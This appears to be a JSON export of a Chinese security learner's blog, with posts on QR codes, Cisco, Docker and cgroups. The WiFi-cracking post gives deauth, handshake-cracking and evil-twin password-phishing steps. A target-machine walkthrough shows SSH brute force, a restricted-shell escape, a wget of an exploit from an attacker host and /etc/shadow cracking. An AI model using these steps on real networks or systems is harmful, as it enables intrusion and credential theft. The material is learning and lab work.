{"meta":{"title":"Lincso & Blog","subtitle":"一个将希望寄托于每天咸鱼，划水学习的网安学习者","description":"Life is from a small mushroom grow strong","author":"Lincso","url":"http://lincso.cn"},"pages":[{"title":"404","date":"2019-01-09T10:43:01.000Z","updated":"2019-01-09T10:45:46.000Z","comments":true,"path":"404/index.html","permalink":"http://lincso.cn/404/index.html","excerpt":"","text":"&lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;404&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;//qzonestyle.gtimg.cn/qzone/hybrid/app/404/search_children.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt; &lt;/body&gt; &lt;/html&gt;"},{"title":"关于我","date":"2019-01-09T11:33:41.000Z","updated":"2019-01-09T11:36:49.000Z","comments":false,"path":"about/index.html","permalink":"http://lincso.cn/about/index.html","excerpt":"","text":""},{"title":"c","date":"2018-12-03T01:44:41.000Z","updated":"2018-12-03T01:44:41.000Z","comments":true,"path":"c/index.html","permalink":"http://lincso.cn/c/index.html","excerpt":"","text":""},{"title":"文章分类","date":"2019-01-09T10:22:59.000Z","updated":"2019-01-09T10:46:42.000Z","comments":false,"path":"categories/index.html","permalink":"http://lincso.cn/categories/index.html","excerpt":"","text":""},{"title":"个人简历","date":"2019-06-18T07:13:36.000Z","updated":"2019-09-01T14:01:53.026Z","comments":false,"path":"resume/index.html","permalink":"http://lincso.cn/resume/index.html","excerpt":"","text":"由于学习经验不足B格不够暂时不给看。。。。"},{"title":"tags","date":"2019-02-14T08:45:10.000Z","updated":"2019-02-14T08:45:46.000Z","comments":true,"path":"tags/index.html","permalink":"http://lincso.cn/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"qr码基础总结","slug":"qr码基础总结","date":"2020-02-13T09:15:44.000Z","updated":"2020-02-13T13:12:43.995Z","comments":true,"path":"2020/02/13/qr码基础总结/","link":"","permalink":"http://lincso.cn/2020/02/13/qr码基础总结/","excerpt":"","text":"二维码在日常生活经常用到可对于二维码如何加解密又知道多少呢？ qrcode的基本结构 位置探测图形、位置探测图形分隔符、定位图形：定位qrcode的位置 校正图形：笔者理解为校正图形的数量确定qrcode的规格 格式信息：qrcode的纠错等级[L|M|Q|H] 版本信息：qrcode的规格，最低为[21x21]，最高为[177x177]；ps：每个版本的递进模块+4 数据和纠错码字：实际保存的二维码信息，和纠错码字（用于修正二维码损坏带来的错误） 编码过程1. 数据分析：确定编码的字符类型，按相应的字符集转换成符号字符; 选择纠错等级 2. 数据编码：将数据字符转换为位流，每8位一个码字，构成一个数据的码字序列 ​ 数据类型最大容量 ​ 对应指示符 ​ version对应数据长度 码字序列是如何组成的？例如：1234567 1.确认一段数据进行分组（数字三位一组，字符两位一组） 123 456 7 2.转换成二进制（根据version转换10|12|14位二进制数，剩下不满三位的转4|7位二进制数） 123--&gt;0001111011 456--&gt;0111001000 7--&gt;0111 3.二进制排列成序列 0001(数字指示标) 0000000111(数据长度7转化的二进制数) 0001111011 0111001000 0111 0000(结束符) 3.纠错编码：按需要将上面的码字序列分块，并根据纠错等级和分块的码字，产生纠错码字，并把纠错码字加入到数据码字序列后面，成为一个新的序列 在二维码规格和纠错等级确定的情况下，其实它所能容纳的码字总数和纠错码字数也就确定了，比如：版本10，纠错等级时H时，总共能容纳346个码字，其中224个纠错码字。就是说二维码区域中大约1/3的码字时冗余的。对于这224个纠错码字，它能够纠正112个替代错误（如黑白颠倒）或者224个据读错误（无法读到或者无法译码），这样纠错容量为：112/346=32.4%。 4.构造最终数据信息：在规格确定的条件下，将上面产生的序列按次序放如分块中 按规定把数据分块，然后对每一块进行计算，得出相应的纠错码字区块，把纠错码字区块 按顺序构成一个序列，添加到原先的数据码字序列后面。如：D1, D12, D23, D35, D2, D13, D24, D36, … D11, D22, D33, D45, D34, D46, E1, E23,E45, E67, E2, E24, E46, E68，… 5.构造矩阵：将探测图形、分隔符、定位图形、校正图形和码字模块放入矩阵中。 6.掩摸：将掩摸图形用于符号的编码区域，使得二维码图形中的深色和浅色（黑色和白色）区域能够比率最优的分布。 7.格式和版本信息：生成格式和版本信息放入相应区域内。 版本7-40都包含了版本信息，没有版本信息的全为0。二维码上两个位置包含了版本信息，它们是冗余的。 版本信息共18位，6X3的矩阵，其中6位时数据为，如版本号8，数据位的信息时 001000，后面的12位是纠错位。 python的qrcode加解密1.qrcode加密 import qrcode import os import sys import time QRImagePath = os.getcwd() + &#39;/qrcode.png&#39; #临时存储位置 qr = qrcode.QRCode( version=1, error_correction=qrcode.constants.ERROR_CORRECT_L, box_size=10, border=2, ) #设置图片格式 data = input() #运行时输入数据 qr.add_data(data) qr.make(fit=True) img = qr.make_image() img.save(&#39;qrcode.png&#39;) #生成图片 if sys.platform.find(&#39;darwin&#39;) &gt;= 0: os.system(&#39;open %s&#39; % QRImagePath) elif sys.platform.find(&#39;linux&#39;) &gt;= 0: os.system(&#39;xdg-open %s&#39; % QRImagePath) else: os.system(&#39;call %s&#39; % QRImagePath) time.sleep(5) #间隔5个单位 os.remove(QRImagePath) #删除图片 2.qrcode解码 import os import logging from PIL import Image import zxing #导入解析包 import random logger = logging.getLogger(__name__) #记录数据 if not logger.handlers: logging.basicConfig(level = logging.INFO) DEBUG = (logging.getLevelName(logger.getEffectiveLevel()) == &#39;DEBUG&#39;) #记录调式过程 # 在当前目录生成临时文件，规避java的路径问题 def ocr_qrcode_zxing(filename): img = Image.open(filename) ran = int(random.random() * 100000) #设置随机数据的大小 img.save(&#39;%s%s.jpg&#39; % (os.path.basename(filename).split(&#39;.&#39;)[0], ran)) zx = zxing.BarCodeReader() #调用zxing二维码读取包 data = &#39;&#39; zxdata = zx.decode(&#39;%s%s.jpg&#39; % (os.path.basename(filename).split(&#39;.&#39;)[0], ran)) #图片解码 # 删除临时文件 os.remove(&#39;%s%s.jpg&#39; % (os.path.basename(filename).split(&#39;.&#39;)[0], ran)) if zxdata: logger.debug(u&#39;zxing识别二维码:%s,内容: %s&#39; % (filename, zxdata)) data = zxdata else: logger.error(u&#39;识别zxing二维码出错:%s&#39; % (filename)) img.save(&#39;%s-zxing.jpg&#39; % filename) return data #返回记录的内容 if __name__ == &#39;__main__&#39;: filename = r&#39;G:\\TestDemo\\venv\\二维码解析与生成\\1536492016.png&#39; # zxing二维码识别 ltext = ocr_qrcode_zxing(filename) #将图片文件里的信息转码放到ltext里面 logger.info(u&#39;[%s]Zxing二维码识别:[%s]!!!&#39; % (filename, ltext)) #记录文本信息 print(ltext) #打印出二维码名字","categories":[{"name":"CTF","slug":"CTF","permalink":"http://lincso.cn/categories/CTF/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://lincso.cn/tags/网络安全/"}]},{"title":"WIFI破解","slug":"2019-11-11-WIFI破解","date":"2019-11-11T06:15:23.000Z","updated":"2020-02-12T13:50:10.384Z","comments":true,"path":"2019/11/11/2019-11-11-WIFI破解/","link":"","permalink":"http://lincso.cn/2019/11/11/2019-11-11-WIFI破解/","excerpt":"关于wifi破解的小技巧 WPA四次握手WPA 握手过程是基于802.1X 协议，使用eapol key进行封装传输,建立通信一共需要五个步骤. AP初始化：使用 SSID 和passphares作为入参，通过哈希算法产生PSK。在WPA-PSK 中PSK=PMK=pdkdf2_SHA1(passphrase, SSID, SSID length, 4096) 第一次握手：AP广播SSID，AP_MAC(AA)；STATION 端使用接收到的SSID，AP_MAC和passphares使用同样算法产生PSK。 第二次握手STATION 发送一个随机数SNonce，STATION_MAC(SA)给AP；AP端接收到SNonce、STATION_MAC(SA)后产生一个随机数ANonce，然后用 PMK、AP_MAC(AA)、STATION_MAC(SA)、SNonce、ANonce 用以下SHA1_PRF算法产生PTK，提取这个 PTK 前16 个字节组成一个MIC KEY。PTK=SHA1_PRF(PMK, Len(PMK), “Pairwise key expansion”, MIN(AA, SA) || Max(AA, SA) || Min(ANonce, SNonce) || Max(ANonce, SNonce))","text":"关于wifi破解的小技巧 WPA四次握手WPA 握手过程是基于802.1X 协议，使用eapol key进行封装传输,建立通信一共需要五个步骤. AP初始化：使用 SSID 和passphares作为入参，通过哈希算法产生PSK。在WPA-PSK 中PSK=PMK=pdkdf2_SHA1(passphrase, SSID, SSID length, 4096) 第一次握手：AP广播SSID，AP_MAC(AA)；STATION 端使用接收到的SSID，AP_MAC和passphares使用同样算法产生PSK。 第二次握手STATION 发送一个随机数SNonce，STATION_MAC(SA)给AP；AP端接收到SNonce、STATION_MAC(SA)后产生一个随机数ANonce，然后用 PMK、AP_MAC(AA)、STATION_MAC(SA)、SNonce、ANonce 用以下SHA1_PRF算法产生PTK，提取这个 PTK 前16 个字节组成一个MIC KEY。PTK=SHA1_PRF(PMK, Len(PMK), “Pairwise key expansion”, MIN(AA, SA) || Max(AA, SA) || Min(ANonce, SNonce) || Max(ANonce, SNonce)) 第三次握手：AP发送上面产生的ANonce给STATIONSTATION 端用接收到ANonce 和以前产生PMK、SNonce、AP_MAC(AA)、STATION_MAC(SA)用同样的算法产生PTK。提取这个PTK 前16 个字节组成一个MIC KEY使用以下算法产生MIC值用这个MIC KEY 和一个802.1X数据帧使用以下算法得到MIC值MIC = HMAC_MD5(MIC Key，16，802.1X data) 第四次握手：STATION 发送802.1X 数据帧，MIC给AP；STATION 端用上面那个准备好的802.1X 数据帧在最后填充上MIC值和两个字节的0（十六进制）然后发送这个数据帧到AP。AP端收到这个数据帧后提取这个MIC。并把这个数据帧的MIC部分都填上0（十六进制）这时用这个802.1X数据帧，和用上面AP产生的 MIC KEY 使用同样的算法得出MIC’。如果MIC’等于STATION 发送过来的MIC。那么第四次握手成功。若不等说明则AP 和 STATION 的密钥不相同，握手失败了。 破解原理用我们字典中的Passphrase+SSID先生成PMK，然后结合握手包中的STA_MAC、AP_MAC、ANONCE、SNONCE计算PTK，再加上原始的报文数据算出MIC并与AP发送的MIC比较，如果一致，那么该PSK就是密钥。 Aircrack-ng破解查找网卡iwconfig 关闭影响网卡监听的功能service network-manager stopairmon-ng check kill 开启网卡监听模式airmon-ng start wlan0 这里网卡名已经变成wlan0mon了 抓wifi数据包airodump-ng wlan0mon 对目标wifi进行deauth当洪水攻击执行后,目标wifi所有设备会停止连接,当有设备重新连接后会抓取设备的握手包 airodump-ng wlan0mon --bssid 58:C8:76:2C:85:50 -c 5 -w wpa2-c代表频道, 后面带的是频道bssid: mac地址(物理地址)-w代表目录(抓到的握手包放在这个目录下面) 如果之前探测包的第一个shell没有出现handshacke,可以进行断网攻击 aireplay-ng -0 0 -a 58:C8:76:2C:85:50 wlan0mon 这里已经有握手包了就断开攻击,毕竟人家一直连不上网也会怀疑出啥问题了 字典爆破密码aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa2-01.cap 成功后这里就会出现密码,我这里就不出成功后的状态了 推荐一个工具fluxion比airmon-ng要方便,上面命令要是不想记用这个方便 github下载地址 进入目录下执行./fluxion.sh 进入工具后选择语言,是有中文的,我这里进入的英文下的 选择1扫描所有信道. 这时会出现这个小白板,当里面有你想要攻击的wifi后ctrl-c停止扫描 这里再选择你自己要攻击的 建立虚假AP 选择1,然后再按enter最后再选择aircrack-ng (Miss chance)进行抓包—–懒得截图 洪水攻击 选择1,之后会有两个窗口,当有设备连进来后选择抓取到的握手包,我这里不演示了 选择握手包后选择web interface,伪造一个假web登录界面(这里所有人都连不上wifi了),当有人输入wifi密码后fluxion脚本结束工作,密码现在你的电脑里了…","categories":[{"name":"Kali学习笔记","slug":"Kali学习笔记","permalink":"http://lincso.cn/categories/Kali学习笔记/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://lincso.cn/tags/网络安全/"}]},{"title":"靶机渗透","slug":"靶机渗透","date":"2019-11-10T13:28:40.000Z","updated":"2020-02-13T08:34:43.296Z","comments":true,"path":"2019/11/10/靶机渗透/","link":"","permalink":"http://lincso.cn/2019/11/10/靶机渗透/","excerpt":"好久没写过文章了,一次来一个实战的靶机渗透教程. 练习靶机的好处可以让你在接触实操的时候不会手忙脚乱不知道该先怎么用,光知道理论永远成为不了一个优秀的大牛. 靶机下载地址https://pan.baidu.com/s/1wTPr1dr1hi1lzTFFu3u3Cg提取码:778f 导入靶机后用pingman扫描靶机ip !/bin/bashif [ &quot;$1&quot; == &quot;&quot; ] thenecho &quot;Usage:./pingman.sh [betwork]&quot;echo &quot;Example:./pingman.sh 192.168.1&quot;elsefor ip in `seq 1 254`; do ping -c 1 $1.$ip | grep &quot;64 bytes&quot; | cut -d &quot; &quot; -f 4 | sed &#39;s/.$//&#39; &amp; donefi 此处ip 靶机:192.168.1.3 kali:192.168.1.5","text":"好久没写过文章了,一次来一个实战的靶机渗透教程. 练习靶机的好处可以让你在接触实操的时候不会手忙脚乱不知道该先怎么用,光知道理论永远成为不了一个优秀的大牛. 靶机下载地址https://pan.baidu.com/s/1wTPr1dr1hi1lzTFFu3u3Cg提取码:778f 导入靶机后用pingman扫描靶机ip !/bin/bashif [ &quot;$1&quot; == &quot;&quot; ] thenecho &quot;Usage:./pingman.sh [betwork]&quot;echo &quot;Example:./pingman.sh 192.168.1&quot;elsefor ip in `seq 1 254`; do ping -c 1 $1.$ip | grep &quot;64 bytes&quot; | cut -d &quot; &quot; -f 4 | sed &#39;s/.$//&#39; &amp; donefi 此处ip 靶机:192.168.1.3 kali:192.168.1.5 第一步nmap扫nmap -A -sS -Pn -p- 192.168.1.3 这里可以看到靶机只有ssh和apache两个服务 进入192.168.1.3:8180可以看到一个nginx初始网页 没有什么可以看到的好东西 dirb目录爆破由于用dirb http://192.168.1.3:8180/也爆不出什么可用网页于是用工具自带的大字典进行爆破 locate dirb—–查看有关dirb的目录位置 big.txt可以用这个找到 这里可以看到apache指定网页的存放路径 我们将自己的hosts文件中的加上域名 192.168.1.3 mario.supermariohost.local 这里是一个没有马里奥的游戏 由于个人原因,这里靶机ip为192.168.36.195 因为上面的东西也没有什么特别有价值的所以我们用御剑再爆一次 dirbuster 这里发现了两个新的网页 command是一个查询用户名的界面,这个界面可以想想之前的ssh服务说不定是这个用户名登录的 luigi里面是一封信 …截图太麻烦所以这里两个页面留给大家自己实践去查看 这里不知道为什么在command.php中怎么也爆不出用户名(可能是作者故意设置的一个坑) 字典生成cewl mario.supermariohost.local:8180/luigi.php -w /root/user.txt john --wordlist=user.txt --stdout --rules &gt;pass.txt 有了字典之后我们就能进行ssh爆破了 hydra ssh爆破hydra -L user.txt -P pass.txt 192.168.36.195 ssh -t 4 -V 这个过程有点长….. 有了帐号密码当然ssh连接看看呀 这里发现有些命令执行不了,管理员做了限制.在终端输入?查看可以使用的命令有awk.好嘞,你等着!!! awk权限绕过awk &#39;BEGIN{system(&quot;/bin/bash&quot;)}&#39; 成功绕过后我们查看内核版本信息,发现是3.13.0的老系统,回到kali找exp进行提权 靶机下载做好的提权脚本 wget 192.168.36.208/exp3.13 有了root权限后使用python切换shell python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39; 在/root下找到flag.zip,发现有密码,继续放到kali进行解密 zip解密fcrackzip -D -p rockyou.txt -u /root/flag.zip 查看flag 这里作者最后让我们把所以的密码都明文解密出来 把/etc/shadow下的root mario luigi copy出来放到kali进行john解密 john --wordlist=rockyou.txt userpass.txt 好了所有的内容都做完了,整理总结,最后密码懒得发图,交给大家自己实践了,哈哈哈","categories":[{"name":"Kali学习笔记","slug":"Kali学习笔记","permalink":"http://lincso.cn/categories/Kali学习笔记/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://lincso.cn/tags/网络安全/"},{"name":"靶机","slug":"靶机","permalink":"http://lincso.cn/tags/靶机/"}]},{"title":"扫描器原理讲解","slug":"扫描器原理讲解","date":"2019-09-23T02:05:46.000Z","updated":"2020-02-12T13:50:38.711Z","comments":true,"path":"2019/09/23/扫描器原理讲解/","link":"","permalink":"http://lincso.cn/2019/09/23/扫描器原理讲解/","excerpt":"好久没更新了，拖更这么久现在弄个纯理论的应付一下 TCP扫描 connect：直接通过connect接口扫描tcp三次握手协议，且扫描速度极快。 SYN：向目标发送一个syn包，若返回syn|ack包则端口开放，若返回rst未开放，比起connect属于半连接，因为并没有建立完整的三次握手协议，所以更加隐蔽。 FIN：向目标发送fin包，成功包将被忽略，失败返回rst。这种方式仅用于unix和一些存在tcp bug的操作系统，不过比起syn还要隐蔽。 Xmas Tree：发送FIN、URG、PUSH包，若关闭返回rst。 reverse ident：ident协议允许通过tcp连接得到进程所有者的用户名，ftp所有者的信息，及其他需要的信息。 ACK：根据ack位的设置情况探测防火墙的安全性。 RPC：unix特有的，检测定位远程过程调用rpc端口及相关程序与版本标号。","text":"好久没更新了，拖更这么久现在弄个纯理论的应付一下 TCP扫描 connect：直接通过connect接口扫描tcp三次握手协议，且扫描速度极快。 SYN：向目标发送一个syn包，若返回syn|ack包则端口开放，若返回rst未开放，比起connect属于半连接，因为并没有建立完整的三次握手协议，所以更加隐蔽。 FIN：向目标发送fin包，成功包将被忽略，失败返回rst。这种方式仅用于unix和一些存在tcp bug的操作系统，不过比起syn还要隐蔽。 Xmas Tree：发送FIN、URG、PUSH包，若关闭返回rst。 reverse ident：ident协议允许通过tcp连接得到进程所有者的用户名，ftp所有者的信息，及其他需要的信息。 ACK：根据ack位的设置情况探测防火墙的安全性。 RPC：unix特有的，检测定位远程过程调用rpc端口及相关程序与版本标号。 UDP扫描 icmp：因为udp本身是无连接，所以不会返回任何响应包，不过端口关闭会返回icmp_port_unreach。这种扫描方式很不可靠，而且比较慢。 icmp扫射：通过速度慢，主要利用ping快速确认网段中有多少活跃主机。 分片扫描：在发送扫描包时，将数据包分成许多ip分片，通过tcp包头分为几段，放入不同ip包中。这种方法能绕过一些包过滤程序，不过某些程序无法正确处理分割包，从而导致崩溃。 ARP定义及原理arp（地址解析协议）工作在数据链路层，与硬件接口联系对上层提供服务。ip数据包通过以太网发送，而以太网设备不识别32位ip地址它们时以48位进行传输的，所以必须把ip目的地址转换成以太网地址。每台主机都会在自己的arp缓冲区中建立arp表，通过此表可表示ip地址对应的mac地址。发送数据包是会查找自己的ARP表，没有则发送ARP广播包，查询目标的mac地址。ARP欺骗则是发送一个自己伪造的arp应答，当其他主机接收到将包放在自己的ARP表中就会造成网络出现掉线等问题。通过arp查mac地址说明有主机存活，通过ping可检测有无防火墙，snmp可判断是否有网络设备，如果是还可以得到设备名。 操作系统识别技术1.icmp查看TTL值，不同的操作系统是不一样的。 Windows NT TTL=107 Windows 2000 TTL=108 Windows 9x TTL=127或128 Linux TTL=240或241 Solaris TTL=252 Lrix TTL=240 2.获取应用程序标识对主机进行Telnet或ftp可返回banner信息。 3.操作系统指纹1.TTL 2.df位 3.Window size 4.ack序号 5.icmp地址屏蔽请求 6.FIN包的响应 7.虚假标识的SYN包 8.ISN 9.icmp错误信息 10.icmp消息引用 11.tos服务类型 12.分段重组处理 13.mss（最大分段尺寸） 14.SYN FLOOD限度 15.主机使用的端口 16.Telnet选项指纹 17.http指纹 18.打印机服务指纹","categories":[{"name":"Kali学习笔记","slug":"Kali学习笔记","permalink":"http://lincso.cn/categories/Kali学习笔记/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://lincso.cn/tags/网络安全/"}]},{"title":"CISCO网络设备基本配置","slug":"CISCO网络设备基本配置","date":"2019-06-22T13:35:43.000Z","updated":"2020-02-12T13:24:44.402Z","comments":true,"path":"2019/06/22/CISCO网络设备基本配置/","link":"","permalink":"http://lincso.cn/2019/06/22/CISCO网络设备基本配置/","excerpt":"交换机1.交换机的工作模式Switch&gt;enable（用户模式） Switch#configure terminal（特权模式） Switch(config)#interface fastEthernet 0/1（全局配置模式） Switch(config-if)#ip address 192.168.1.1 255.255.255.0（接口模式） no shutdown（开启接口） exit返回上一模式 end直接退到特权模式","text":"交换机1.交换机的工作模式Switch&gt;enable（用户模式） Switch#configure terminal（特权模式） Switch(config)#interface fastEthernet 0/1（全局配置模式） Switch(config-if)#ip address 192.168.1.1 255.255.255.0（接口模式） no shutdown（开启接口） exit返回上一模式 end直接退到特权模式 2.常用命令特权模式下 show running-config（查看配置信息） show version（查看IOS版本信息） show mac-address-table（查看MAC地址表） show interface fastethernet 0/1（查看接口信息双工和速率） write（保存交换机配置） reload（恢复设备出厂默认值） 全局模式下 hostname default（修改主机名） enable password 123456（配置enable明文口令） enable secret 123456（配置enable加密口令） no ip domain-lookup（禁用DNS查询） 接口模式下 ip address ip地址 子网掩码（配置静态ip） duplex [full|half|auto]（全双工、半双工、自动） speed[10|100|1000|auto]（通信速率） vlan的配置vlan 10（创建vlan） name aaa（进入vlan后给vlan命名） interface vlan 10（进入vlan10） ip address 192.168.1.10 255.255.255.0 no shutdown no vlan 10（删除vlan） interface range f0/1 – 10 switchport access vlan 10（将1-10接口划入vlan10） 默认网关配置ip default-gateway 192.168.1.1 虚拟端口配置（telnet）line vty 0 4 password 123456 login 路由器查看路由表show ip route 路由接口ip配置intface serial0/1 ip address 192.168.1.1 255.255.255.0 clock rate 64000（设置时钟） no shutdown 默认路由ip route 0.0.0.0 0.0.0.0 下一跳 静态路由配置ip route 目标网络ID 子网掩码 下一跳ip或设备出口的接口 RIP配置route rip network 192.168.10.0（路由中的网段） network 192.168.20.0 version 2 no auto-summary ospf配置route ospf 10（设置进程号） network 192.168.10.0 0.0.0.255 area 0（area设置区域号） network 192.168.20.0 0.0.0.255 area 0 nat配置ip nat inside source static 192.168.1.1 172.16.1.1（静态ip转换） int f0/0 ip nat inside int f0/1 ip nat outside 出口段连接的设备做ip route就好了 DHCP配置ip route pool aaa（定义地址池） network 192.168.1.0 255.255.255.0（动态分配） default-router 192.168.1.1（动态分配网关） dns-server 8.8.8.8（动态分配dns服务器地址） exit ip dhcp excluded-address 192.168.1.100 192.168.1.110（排除的ip地址） ip helper-address 192.168.1.250（DHCP中继地址---向服务器请求分配DHCP地址） ACL配置（acl编号取值范围（100-199））access-list 101 deny host 192.168.1.10（拒绝ip为192.168.1.10的主机访问路由出口的主机） access-list 101 deny any（允许其他的流量访问） 进入接口后 ip access-group 101 in（将ACL应用与接口，生效ACL配置） 扩展ACL配置（配置完后记得用access-group生效配置） access-list 101 permit tcp 192.168.10.0 0.0.0.255 host 192.168.20.5 eq www|80（允许192.168.1.10的网段走tcp协议访问192.168.20.5的主机的万维网服务） 补充acl编号取值范围（100-199） access-list 101 permit any any（允许其他网段访问） show access-list 101（查看ACL信息） 三层交换机配置开启路由功能ip routing 配置trunk并封装switchport trunk encapsulation dot1q switchport mode trunk no switchport （进入真实接口） 。 。。 。。。 。。。。 。。。。。 三次在我感觉就是多了路由功能的交换机，配置看上面的就好了 单臂路由实例 SW1配置Switch&gt;enable Switch#config terminal Switch(config)#hostname SW1 SW1(config)#vlan2 SW1(config-vlan)#exit SW1(config)vlan 3 SW1(config-vlan)exit SW1(config)#interface fastEthernet 1/1 SW1(config-if)#switchport mode access（配置接口为access口，科普除trunk模式外还有access、hybrid） SW1(config-if)#switchport access vlan 2 SW1(config-if)#exit SW1(config)#interface fastEthernet 2/1 SW1(config-if)#switchport mode access SW1(config-if)#switchport access vlan 3 SW1(config-if)#exit SW1(config)#interface fastEthernet 0/1 SW1(config-if)#switchport mode trunk SW1(config-if)#switchport trunk allowed vlan 2,3（配置turnk口允许vlan2 和vlan3通过，除了vlan2和vlan3，其他所有的vlan默认拒绝所有，这里实验可加可不加） R1配置Switch&gt;enable Swtich#config terminal Switch(config)#hostname R1 R1(config)#interface fastEthernet 0/0 R1(config-if)#no shutdown R1(config-if)#exit R1(config)#interface fastEthernet0/0.1 R1(config-subif)#encapsulation dot1Q 2 R1(config-subif)#ip address 192.168.2.1 255.255.255.0 R1(config-subif)#exit R1(config)#interface fastEthernet 0/0.2 R1(config-subif)#encapsulation dot1Q 3 R1(config-subif)#ip address 192.168.3.1 255.255.255.0 关于trunk、access、hybrid的理解具有access性质的端口只能属于一个vlan，且端口不打tag 具有trunk性质的端口可以属于多个vlan，且端口都是打tag的 具有hubrid性质的端口可以属于多个vlan，是否打开tag由用户而定 tag的理解就想貼了同样标签的东西他们是可以互相通信的，比如小米手机用MIUI系统，而苹果手机用IOS系统","categories":[{"name":"思科网络笔记","slug":"思科网络笔记","permalink":"http://lincso.cn/categories/思科网络笔记/"}],"tags":[{"name":"cisco","slug":"cisco","permalink":"http://lincso.cn/tags/cisco/"},{"name":"基础网络","slug":"基础网络","permalink":"http://lincso.cn/tags/基础网络/"}]},{"title":"Docker使用","slug":"Docker使用","date":"2019-03-14T11:23:51.000Z","updated":"2019-08-10T15:57:14.733Z","comments":true,"path":"2019/03/14/Docker使用/","link":"","permalink":"http://lincso.cn/2019/03/14/Docker使用/","excerpt":"由于上篇有讲到关于docker的cgroup运维，这次就写一篇关于docker的基本使用吧。还是说明一下，docker不同与物理的虚拟化，基于docker引擎运行一个容器，在仓库里拉取镜像每次容器之间互不干扰。云计算比赛要求，这里使用的操作系统是centos7. 首先安装docker及配置yum install -y docker | yum install -y docker-io vi /etc/sysconfig/docker 在配置文件最后添加ADD_REGISTRY=&#39;--add-registry 192.168.100.10:5000&#39; INSECURE_REGISTRY=&#39;--insecure-registry 192.168.100.10:5000&#39;","text":"由于上篇有讲到关于docker的cgroup运维，这次就写一篇关于docker的基本使用吧。还是说明一下，docker不同与物理的虚拟化，基于docker引擎运行一个容器，在仓库里拉取镜像每次容器之间互不干扰。云计算比赛要求，这里使用的操作系统是centos7. 首先安装docker及配置yum install -y docker | yum install -y docker-io vi /etc/sysconfig/docker 在配置文件最后添加ADD_REGISTRY=&#39;--add-registry 192.168.100.10:5000&#39; INSECURE_REGISTRY=&#39;--insecure-registry 192.168.100.10:5000&#39; 这里ip对应你的服务器ip docker服务重启systemctl daemon-reload systemctl restart docker 查看系统信息docker info 添加本地镜像库docker load -i &lt;镜像&gt; | docker load &lt; &lt;镜像&gt; docker images docker tag &lt;image id&gt; &lt; 镜像仓库源:镜像标签 &gt;比如centos:latest 上传镜像到docker仓库 docker push centos:latest 这样另一台pc就可以使用服务器的镜像了 docker pull centos:latest docker rmi &lt;image id&gt;(删除镜像) 有了镜像就可以运行容器了docker run -it --name centos centos:latest /bin/bash(这里是使用一个伪终端与容器进行互交) docker run -d --name centos centos:latest(这里是在后台运行容器并返回一个id) docker ps(查看已运行的容器) docker ps -a(查看所有容器) docker ps -aq(查看所有容器的id)配合docker rm ${docker ps -aq}使用可以删除所有的容器 如果镜像正在运行要先关闭容器才行 docker stop &lt;容器id&gt; 进入容器docker attach &lt;容器id&gt; | docker exec -it centos /bin/bash 构建镜像构建镜像需要一个Dockerfile文件 比如这样(引用菜鸟教程的) runoob@runoob:~$ cat Dockerfile FROM centos:6.7 MAINTAINER Fisher &quot;fisher@sudops.com&quot; RUN /bin/echo &#39;root:123456&#39; |chpasswd RUN useradd runoob RUN /bin/echo &#39;runoob:123456&#39; |chpasswd RUN /bin/echo -e &quot;LANG=\\&quot;en_US.UTF-8\\&quot;&quot; &gt;/etc/default/local EXPOSE 22 EXPOSE 80 CMD /usr/sbin/sshd -D docker build -t centos:latest . 最近懒得截图所以就不发图片给大家看实例了。","categories":[{"name":"随笔","slug":"随笔","permalink":"http://lincso.cn/categories/随笔/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://lincso.cn/tags/docker/"},{"name":"云计算","slug":"云计算","permalink":"http://lincso.cn/tags/云计算/"}]},{"title":"docker+cgroup运维","slug":"docker-cgroup运维","date":"2019-03-10T02:11:03.000Z","updated":"2019-08-10T15:57:14.761Z","comments":true,"path":"2019/03/10/docker-cgroup运维/","link":"","permalink":"http://lincso.cn/2019/03/10/docker-cgroup运维/","excerpt":"CGroup 介绍CGroup 是 Control Groups 的缩写，是 Linux 内核提供的一种可以限制、记录、隔离进程组 (process groups) 所使用的物力资源 (如 cpu memory i/o 等等) 的机制。2007 年进入 Linux 2.6.24 内核，CGroups 不是全新创造的，它将进程管理从 cpuset 中剥离出来，作者是 Google 的 Paul Menage。CGroups 也是 LXC 为实现虚拟化所使用的资源管理手段。","text":"CGroup 介绍CGroup 是 Control Groups 的缩写，是 Linux 内核提供的一种可以限制、记录、隔离进程组 (process groups) 所使用的物力资源 (如 cpu memory i/o 等等) 的机制。2007 年进入 Linux 2.6.24 内核，CGroups 不是全新创造的，它将进程管理从 cpuset 中剥离出来，作者是 Google 的 Paul Menage。CGroups 也是 LXC 为实现虚拟化所使用的资源管理手段。 blkio – 这个子系统为块设备设定输入/输出限制，比如物理设备（磁盘，固态硬盘，USB 等等）。cpu – 这个子系统使用调度程序提供对 CPU 的 cgroup 任务访问。cpuacct – 这个子系统自动生成 cgroup 中任务所使用的 CPU 报告。cpuset – 这个子系统为 cgroup 中的任务分配独立 CPU（在多核系统）和内存节点。devices – 这个子系统可允许或者拒绝 cgroup 中的任务访问设备。freezer – 这个子系统挂起或者恢复 cgroup 中的任务。memory – 这个子系统设定 cgroup 中任务使用的内存限制，并自动生成由那些任务使用的内存资源报告。net_cls – 这个子系统使用等级识别符（classid）标记网络数据包，可允许 Linux 流量控制程序（tc）识别从具体 cgroup 中生成的数据包。 (设置开机自启并启动)systemctl enable cgconfig systemctl start cgconfig mount -l cgroup(查看cgroup挂载点)/sys/fs/cgroup 限制cpu实例控制一个进程的cpu资源分配docker run -it 镜像id /bin/bash vi cpu.sh !/bin/bashi=0while truedolet i++done chmod +x cpu.sh./cpu.sh top(查看脚本占用cpu的资源量) systemd-cgls(查看系统cgroup tree) 查看主要内容─system.slice ??├─systemd-machined.service??│ └─4909 /usr/lib/systemd/systemd-machined??├─docker-06e008e6ecec4f5c138e568c6b5b1659387a003b1cfb037c07006679db976d63.scope（容器）??│ ├─4889 /bin/bash??│ └─4982 